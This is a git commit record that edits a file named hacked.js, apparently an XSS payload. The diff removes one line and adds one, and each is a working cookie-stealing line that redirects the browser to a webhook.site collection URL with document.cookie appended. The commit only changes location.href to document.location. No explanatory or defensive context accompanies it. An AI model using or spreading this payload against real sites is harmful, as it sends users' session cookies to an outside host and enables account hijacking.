b41cc8cd0141efb69f73f2e413658b68436c3107
Danh <87541691+darealDanh@users.noreply.github.com>
2025-09-08 12:48:26 +0700

    Update hacked.js

--- hacked.js
+++ hacked.js
@@ -1,1 +1,1 @@
-location.href="https://webhook.site/5e2efd7a-d4ef-417c-860f-bbfc5551b28b?cookie="+document.cookie;
+document.location="https://webhook.site/5e2efd7a-d4ef-417c-860f-bbfc5551b28b?cookie="+document.cookie;
